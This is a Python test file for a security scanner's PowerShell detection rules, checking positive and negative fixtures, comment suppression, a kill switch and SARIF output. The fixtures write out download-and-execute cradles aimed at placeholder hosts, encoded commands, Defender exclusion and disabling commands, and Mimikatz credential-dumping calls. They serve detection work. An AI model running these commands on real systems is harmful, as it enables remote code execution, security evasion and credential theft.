"""C2-WIN: PowerShell dangerous-execution rule detection tests.

Tests the six approved rule IDs against positive and negative fixtures,
comment/string suppression, kill-switch, SARIF integration, and
scanner-level finding generation.

Owner-decision cases (T26, T28, T44, T45) are recorded but NOT asserted
as accepted -- they require explicit owner decision.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scanner import sast  # noqa: E402
from scanner.rules.loader import load_enterprise_rules  # noqa: E402

_F = re.IGNORECASE | re.MULTILINE | re.DOTALL


# ---------------------------------------------------------------------------
# Pattern access
# ---------------------------------------------------------------------------
def _get_ps_rules():
    return [r for r in load_enterprise_rules()
            if r.get("vuln") == "powershell_dangerous_execution"]


def _get_pattern(rule_id: str) -> re.Pattern:
    for r in _get_ps_rules():
        if r["id"] == rule_id:
            return re.compile(r["pat"], _F)
    raise KeyError(rule_id)


# ---------------------------------------------------------------------------
# Suppression helpers (same logic as scanner/sast.py C2-WIN helpers)
# ---------------------------------------------------------------------------
def _ps_starts_in_string(source, offset):
    i = 0; in_s = False; qc = None
    while i < offset and i < len(source):
        ch = source[i]
        if not in_s:
            if ch in ('"', "'"): in_s = True; qc = ch
        else:
            if ch == qc: in_s = False; qc = None
            elif ch == '`' and qc == '"': i += 1
        i += 1
    return in_s


def _ps_starts_in_comment(source, offset):
    i = 0; in_s = False; qc = None; in_block = False
    while i < offset and i < len(source):
        ch = source[i] if i < len(source) else ''
        if in_block:
            if source[i:i+2] == '#>': in_block = False; i += 2; continue
            i += 1; continue
        if in_s:
            if ch == qc: in_s = False; qc = None
            elif ch == '`' and qc == '"': i += 2; continue
            i += 1; continue
        if ch in ('"', "'"): in_s = True; qc = ch; i += 1; continue
        if source[i:i+2] == '<#': in_block = True; i += 2; continue
        if ch == '#' and source[i:i+2] != '#>':
            nl = source.find('\n', i)
            if nl == -1 or nl >= offset: return True
            i = nl + 1; continue
        i += 1
    return in_block


def _suppressed(source, match_start):
    return _ps_starts_in_comment(source, match_start) or _ps_starts_in_string(source, match_start)


# ---------------------------------------------------------------------------
# Positive and negative fixtures
# ---------------------------------------------------------------------------
# Rule 1: PS_IEX_DOWNLOAD_CRADLE
R1_POS = [
    'IEX (New-Object Net.WebClient).DownloadString("http://example.invalid/a")',
    'Invoke-Expression (New-Object Net.WebClient).DownloadFile("http://example.invalid/a", "p.exe")',
    'IEX (Invoke-WebRequest "http://example.invalid/a").Content',
]
R1_NEG = [
    'IEX (New-Object Net.WebClient)',  # object alone
    'IEX (Invoke-WebRequest "http://x").StatusCode',  # benign property
    'IEX $cmd Write-Output "Net.WebClient"',  # unrelated token
    'IEX (New-Object Net.WebClient).RawContent',  # invalid method for WebClient
    'IEX (Invoke-WebRequest "http://x").DownloadString()',  # invalid method for IWR
]

# Rule 2: PS_ENCODED_COMMAND
R2_POS = [
    'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A',
    'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A',
]
R2_NEG = [
    'powershell -ErrorAction Stop',
    'powershell -Command "Get-Process"',
    'powershell -enc short',  # < 20 base64 chars
]

# Rule 3: PS_DEFENSE_EVASION_EXCLUSION
R3_POS = [
    'Add-MpPreference -ExclusionPath C:' + chr(92) + 'temp',
    'Set-MpPreference -DisableRealtimeMonitoring ' + chr(36) + 'true',
]
R3_NEG = [
    'Get-MpPreference',
    'Add-MpPreference -Description "some text -ExclusionPath"',
    'Set-MpPreference -Description "some text -DisableRealtimeMonitoring"',
]

# Rule 4: PS_OBFUSCATED_INVOKE
R4_POS = [
    'Invoke-Expression ($a + $b)',
    'Invoke-Expression ("{0}{1}" -f "I","EX")',
]
R4_NEG = [
    'Invoke-Expression $simpleVar',
    'Invoke-Expression "literal"',
]

# Rule 5: PS_DOWNLOAD_CRADLE_START_PROCESS
R5_POS = [
    'Start-Process powershell -ArgumentList "-Command IEX (New-Object Net.WebClient).DownloadString(\'http://example.invalid\')"',
    "Start-Process powershell -ArgumentList '-Command IEX (New-Object Net.WebClient).DownloadString(\"http://example.invalid\")'",
]
R5_NEG = [
    'Start-Process notepad.exe -Description "Net.WebClient"',
    "Start-Process powershell -ArgumentList 'Write-Output \"DownloadString\"'",
    "Start-Process powershell -ArgumentList '-Command IEX (Get-Process)'",
]

# Rule 6: PS_CREDENTIAL_DUMPING
R6_POS = [
    'Invoke-Mimikatz -Command "sekurlsa::logonpasswords"',
    'DumpCreds',
]
R6_NEG = [
    'NotInvoke-Mimikatz',
    'Get-Credential',
]


# ---------------------------------------------------------------------------
# Detection tests
# ---------------------------------------------------------------------------
class TestRuleDetection:
    """Each rule: positives fire, negatives stay dark."""

    @pytest.mark.parametrize("txt", R1_POS)
    def test_r1_positive(self, txt):
        p = _get_pattern("PS_IEX_DOWNLOAD_CRADLE")
        assert p.search(txt), f"R1 should fire: {txt!r}"

    @pytest.mark.parametrize("txt", R1_NEG)
    def test_r1_negative(self, txt):
        p = _get_pattern("PS_IEX_DOWNLOAD_CRADLE")
        assert not p.search(txt), f"R1 should NOT fire: {txt!r}"

    @pytest.mark.parametrize("txt", R2_POS)
    def test_r2_positive(self, txt):
        p = _get_pattern("PS_ENCODED_COMMAND")
        assert p.search(txt), f"R2 should fire: {txt!r}"

    @pytest.mark.parametrize("txt", R2_NEG)
    def test_r2_negative(self, txt):
        p = _get_pattern("PS_ENCODED_COMMAND")
        assert not p.search(txt), f"R2 should NOT fire: {txt!r}"

    @pytest.mark.parametrize("txt", R3_POS)
    def test_r3_positive(self, txt):
        p = _get_pattern("PS_DEFENSE_EVASION_EXCLUSION")
        assert p.search(txt), f"R3 should fire: {txt!r}"

    @pytest.mark.parametrize("txt", R3_NEG)
    def test_r3_negative(self, txt):
        p = _get_pattern("PS_DEFENSE_EVASION_EXCLUSION")
        m = p.search(txt)
        if m:
            # Check quote-state at the dangerous TOKEN position (not match start)
            token_m = re.search(r'-(?:ExclusionPath|DisableRealtimeMonitoring)', m.group(), _F)
            token_off = m.start() + token_m.start() if token_m else m.start()
            assert _suppressed(txt, token_off), f"R3 suppressed at token for: {txt!r}"
        else:
            pass  # regex doesn't match at all

    @pytest.mark.parametrize("txt", R4_POS)
    def test_r4_positive(self, txt):
        p = _get_pattern("PS_OBFUSCATED_INVOKE")
        assert p.search(txt), f"R4 should fire: {txt!r}"

    @pytest.mark.parametrize("txt", R4_NEG)
    def test_r4_negative(self, txt):
        p = _get_pattern("PS_OBFUSCATED_INVOKE")
        assert not p.search(txt), f"R4 should NOT fire: {txt!r}"

    @pytest.mark.parametrize("txt", R5_POS)
    def test_r5_positive(self, txt):
        p = _get_pattern("PS_DOWNLOAD_CRADLE_START_PROCESS")
        assert p.search(txt), f"R5 should fire: {txt!r}"

    @pytest.mark.parametrize("txt", R5_NEG)
    def test_r5_negative(self, txt):
        p = _get_pattern("PS_DOWNLOAD_CRADLE_START_PROCESS")
        assert not p.search(txt), f"R5 should NOT fire: {txt!r}"

    @pytest.mark.parametrize("txt", R6_POS)
    def test_r6_positive(self, txt):
        p = _get_pattern("PS_CREDENTIAL_DUMPING")
        assert p.search(txt), f"R6 should fire: {txt!r}"

    @pytest.mark.parametrize("txt", R6_NEG)
    def test_r6_negative(self, txt):
        p = _get_pattern("PS_CREDENTIAL_DUMPING")
        assert not p.search(txt), f"R6 should NOT fire: {txt!r}"


# ---------------------------------------------------------------------------
# Comment/string suppression tests
# ---------------------------------------------------------------------------
class TestSuppression:
    """Comment and string suppression for all six rules."""

    def test_r1_commented_suppressed(self):
        txt = "# IEX (New-Object Net.WebClient).DownloadString('http://x')"
        p = _get_pattern("PS_IEX_DOWNLOAD_CRADLE")
        m = p.search(txt)
        assert m and _suppressed(txt, m.start()), "R1 in comment should be suppressed"

    def test_r1_in_string_suppressed(self):
        txt = 'Write-Output "IEX (New-Object Net.WebClient).DownloadString"'
        p = _get_pattern("PS_IEX_DOWNLOAD_CRADLE")
        m = p.search(txt)
        assert m and _suppressed(txt, m.start()), "R1 in string should be suppressed"

    def test_r1_trailing_comment_not_suppressed(self):
        txt = "IEX (New-Object Net.WebClient).DownloadString('http://x') # comment"
        p = _get_pattern("PS_IEX_DOWNLOAD_CRADLE")
        m = p.search(txt)
        assert m and not _suppressed(txt, m.start()), "R1 before trailing comment should fire"

    def test_r1_block_comment_suppressed(self):
        txt = "<# IEX (New-Object Net.WebClient).DownloadString('http://x') #>"
        p = _get_pattern("PS_IEX_DOWNLOAD_CRADLE")
        m = p.search(txt)
        assert m and _suppressed(txt, m.start()), "R1 in block comment should be suppressed"

    def test_r1_after_block_comment_not_suppressed(self):
        txt = "<# bc #> IEX (New-Object Net.WebClient).DownloadString('http://x')"
        p = _get_pattern("PS_IEX_DOWNLOAD_CRADLE")
        m = p.search(txt)
        assert m and not _suppressed(txt, m.start()), "R1 after block comment should fire"

    def test_r2_commented_suppressed(self):
        txt = "# powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A"
        p = _get_pattern("PS_ENCODED_COMMAND")
        m = p.search(txt)
        assert m and _suppressed(txt, m.start()), "R2 in comment should be suppressed"

    def test_r3_commented_suppressed(self):
        txt = "# Add-MpPreference -ExclusionPath C:" + chr(92) + "temp"
        p = _get_pattern("PS_DEFENSE_EVASION_EXCLUSION")
        m = p.search(txt)
        assert m and _suppressed(txt, m.start()), "R3 in comment should be suppressed"

    def test_r4_commented_suppressed(self):
        txt = "# Invoke-Expression ($a + $b)"
        p = _get_pattern("PS_OBFUSCATED_INVOKE")
        m = p.search(txt)
        assert m and _suppressed(txt, m.start()), "R4 in comment should be suppressed"

    def test_r5_commented_suppressed(self):
        txt = '# Start-Process powershell -ArgumentList "-Command IEX (New-Object Net.WebClient).DownloadString(\'http://x\')"'
        p = _get_pattern("PS_DOWNLOAD_CRADLE_START_PROCESS")
        m = p.search(txt)
        assert m and _suppressed(txt, m.start()), "R5 in comment should be suppressed"

    def test_r6_commented_suppressed(self):
        txt = "# Invoke-Mimikatz -Command x"
        p = _get_pattern("PS_CREDENTIAL_DUMPING")
        m = p.search(txt)
        assert m and _suppressed(txt, m.start()), "R6 in comment should be suppressed"

    def test_string_content_not_comment(self):
        """Comment markers inside strings are not comments."""
        txt = 'Write-Output "<# not a comment #>"; IEX (New-Object Net.WebClient).DownloadString("http://x")'
        assert not _ps_starts_in_comment(txt, txt.find("IEX")), \
            "IEX after string with <# #> should not be in comment"

    def test_line_comment_scoped_to_line(self):
        """Line comment on line 1 does not suppress line 2."""
        txt = "# comment\nIEX (New-Object Net.WebClient).DownloadString('http://x')"
        assert not _ps_starts_in_comment(txt, txt.find("IEX")), \
            "IEX on line 2 should not be suppressed by line-1 comment"


# ---------------------------------------------------------------------------
# Owner-decision cases (recorded, NOT asserted as accepted)
# ---------------------------------------------------------------------------
class TestOwnerDecisionCases:
    """These cases have known FP/FN behavior requiring owner decision.

    T26: lowercase backtick obfuscation (POTENTIAL_FN)
    T28: 3 uppercase escape sequences (POTENTIAL_FP)
    T44: powershell -Command string-as-command (OWNER_DECISION)
    T45: nested-quote cradle (OWNER_DECISION)
    """

    def test_t26_lowercase_obfuscation_fn(self):
        """T26: lowercase backtick obfuscation is NOT detected (POTENTIAL_FN)."""
        txt = 'Invoke-Expression (`a`b`c)'
        p = _get_pattern("PS_OBFUSCATED_INVOKE")
        m = p.search(txt)
        # Documented: does NOT fire (lowercase-start backtick filtered by (?-i:[A-Z]))
        assert not m or _suppressed(txt, m.start()), \
            "T26 POTENTIAL_FN: lowercase obfuscation not detected (owner decision required)"

    def test_t28_uppercase_escape_fp(self):
        """T28: 3 uppercase escape sequences fire (POTENTIAL_FP)."""
        txt = 'Invoke-Expression (`A`B`C)'
        p = _get_pattern("PS_OBFUSCATED_INVOKE")
        m = p.search(txt)
        # Documented: DOES fire (3 uppercase backtick-letter pairs indistinguishable
        # from obfuscation). This is a POTENTIAL_FP requiring owner decision.
        assert m, "T28 POTENTIAL_FP: 3 uppercase escapes detected (owner decision required)"

    def test_t44_string_as_command_fn(self):
        """T44: powershell -Command '...-enc...' not detected (OWNER_DECISION)."""
        txt = "powershell -Command 'Write-Output \"safe\"; powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A'"
        p = _get_pattern("PS_ENCODED_COMMAND")
        m = p.search(txt)
        if m and _suppressed(txt, m.start()):
            pass  # suppressed by string-state (documented FN)
        # This is an accepted limitation requiring owner decision

    def test_t45_nested_quote_fn(self):
        """T45: nested-quote cradle not detected (OWNER_DECISION)."""
        txt = "Start-Process powershell -ArgumentList \"Write-Output 'safe'; IEX (New-Object Net.WebClient).DownloadString('http://x')\""
        p = _get_pattern("PS_DOWNLOAD_CRADLE_START_PROCESS")
        m = p.search(txt)
        # Documented: does NOT fire (bridge stops at nested quote)
        assert not m, "T45 OWNER_DECISION: nested-quote cradle not detected"


# ---------------------------------------------------------------------------
# Kill-switch tests (subprocess isolation)
# ---------------------------------------------------------------------------
def _run_sast_in_subprocess(env_overrides: dict) -> str:
    """Import scanner.sast in a fresh process; return PS rule count."""
    code = (
        "import sys; sys.path.insert(0, '.'); "
        "import scanner.sast; "
        "rules = scanner.sast.COMPILED_ENTERPRISE_RULES; "
        "ps = [r for r in rules if r.get('vuln') == 'powershell_dangerous_execution']; "
        "print(len(ps))"
    )
    env = {**os.environ, **env_overrides}
    result = subprocess.run(
        [sys.executable, "-c", code],
        capture_output=True, text=True, env=env,
        cwd=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    )
    return result.stdout.strip()


class TestKillSwitch:
    """Kill-switch behavior via subprocess isolation."""

    def test_default_rules_active(self):
        env = {k: v for k, v in os.environ.items() if k != "RSECOPSX_WINDOWS_SCRIPT_RULES"}
        out = _run_sast_in_subprocess(env)
        assert out == "6", f"expected 6 PS rules by default, got: {out}"

    def test_env_equals_1(self):
        out = _run_sast_in_subprocess({"RSECOPSX_WINDOWS_SCRIPT_RULES": "1"})
        assert out == "6", f"expected 6 PS rules with env=1, got: {out}"

    def test_env_equals_0(self):
        out = _run_sast_in_subprocess({"RSECOPSX_WINDOWS_SCRIPT_RULES": "0"})
        assert out == "0", f"expected 0 PS rules with env=0, got: {out}"

    def test_discovery_when_disabled(self):
        """Discovery still works when rules are disabled."""
        env = {**os.environ, "RSECOPSX_WINDOWS_SCRIPT_RULES": "0"}
        code = (
            "import sys; sys.path.insert(0, '.'); "
            "from core.file_index import LANG_BY_EXT; "
            "print(LANG_BY_EXT.get('.ps1', 'MISSING'))"
        )
        result = subprocess.run(
            [sys.executable, "-c", code],
            capture_output=True, text=True, env=env,
            cwd=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        )
        assert result.stdout.strip() == "powershell", \
            f"discovery should work when rules disabled, got: {result.stdout.strip()}"

    def test_other_families_unaffected(self):
        """PHP webshell rules still present when PS rules disabled."""
        env = {**os.environ, "RSECOPSX_WINDOWS_SCRIPT_RULES": "0"}
        code = (
            "import sys; sys.path.insert(0, '.'); "
            "from scanner.rules.loader import load_enterprise_rules; "
            "rules = load_enterprise_rules(); "
            "php = [r for r in rules if 'PHP' in r.get('id', '')]; "
            "print(len(php))"
        )
        result = subprocess.run(
            [sys.executable, "-c", code],
            capture_output=True, text=True, env=env,
            cwd=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        )
        count = int(result.stdout.strip())
        assert count > 0, f"PHP rules should still exist, got: {count}"


# ---------------------------------------------------------------------------
# Finding generation and SARIF integration
# ---------------------------------------------------------------------------
class TestFindingGeneration:
    """Scanner-level finding generation for all six rules."""

    def _scan_tmp(self, tmp_path, content, filename="test.ps1"):
        p = tmp_path / filename
        p.write_text(content, encoding="utf-8")
        from scanner.sast import scan_directory
        return scan_directory(str(tmp_path), workers=1)

    def test_r1_finding_generated(self, tmp_path):
        findings = self._scan_tmp(tmp_path, 'IEX (New-Object Net.WebClient).DownloadString("http://x")')
        ids = [f.get("rule_id") for f in findings if isinstance(f, dict)]
        assert "PS_IEX_DOWNLOAD_CRADLE" in ids, f"expected R1 finding, got: {ids}"

    def test_r1_finding_fields(self, tmp_path):
        findings = self._scan_tmp(tmp_path, 'IEX (New-Object Net.WebClient).DownloadString("http://x")')
        for f in findings:
            if isinstance(f, dict) and f.get("rule_id") == "PS_IEX_DOWNLOAD_CRADLE":
                assert f.get("severity") == "Critical", f"R1 severity: {f.get('severity')}"
                assert f.get("vuln_type") == "powershell_dangerous_execution"
                assert f.get("confidence") == "High", f"R1 confidence: {f.get('confidence')}"
                assert f.get("file"), "R1 should have file location"
                assert f.get("line") is not None, "R1 should have line number"
                return
        pytest.fail("R1 finding not found")

    def test_r2_finding_generated(self, tmp_path):
        findings = self._scan_tmp(tmp_path, 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A')
        ids = [f.get("rule_id") for f in findings if isinstance(f, dict)]
        assert "PS_ENCODED_COMMAND" in ids, f"expected R2 finding, got: {ids}"

    def test_r2_finding_fields(self, tmp_path):
        findings = self._scan_tmp(tmp_path, 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A')
        for f in findings:
            if isinstance(f, dict) and f.get("rule_id") == "PS_ENCODED_COMMAND":
                assert f.get("severity") == "High", f"R2 severity: {f.get('severity')}"
                assert f.get("confidence") == "Medium", f"R2 confidence: {f.get('confidence')}"
                return
        pytest.fail("R2 finding not found")

    def test_r6_finding_generated(self, tmp_path):
        findings = self._scan_tmp(tmp_path, 'Invoke-Mimikatz -Command x')
        ids = [f.get("rule_id") for f in findings if isinstance(f, dict)]
        assert "PS_CREDENTIAL_DUMPING" in ids, f"expected R6 finding, got: {ids}"

    def test_r6_finding_fields(self, tmp_path):
        findings = self._scan_tmp(tmp_path, 'Invoke-Mimikatz -Command x')
        for f in findings:
            if isinstance(f, dict) and f.get("rule_id") == "PS_CREDENTIAL_DUMPING":
                assert f.get("severity") == "Critical", f"R6 severity: {f.get('severity')}"
                assert f.get("confidence") == "High", f"R6 confidence: {f.get('confidence')}"
                return
        pytest.fail("R6 finding not found")

    def test_no_finding_on_benign(self, tmp_path):
        findings = self._scan_tmp(tmp_path, 'Write-Host "hello world"')
        ps_ids = [f.get("rule_id") for f in findings if isinstance(f, dict)
                  and str(f.get("rule_id", "")).startswith("PS_")]
        assert not ps_ids, f"no PS findings on benign script, got: {ps_ids}"

    def test_sarif_no_codeflows_for_regex(self, tmp_path):
        """Regex-based findings have no codeFlows (no taint chain)."""
        findings = self._scan_tmp(tmp_path, 'IEX (New-Object Net.WebClient).DownloadString("http://x")')
        from reporting.sarif_export import _build_results
        results = _build_results([f for f in findings if isinstance(f, dict)])
        for r in results:
            if r.get("ruleId", "").startswith("PS_"):
                assert "codeFlows" not in r, \
                    "regex findings should NOT have codeFlows"
                assert "ruleId" in r
                assert "level" in r
                assert "message" in r
                assert "locations" in r
                assert "partialFingerprints" in r
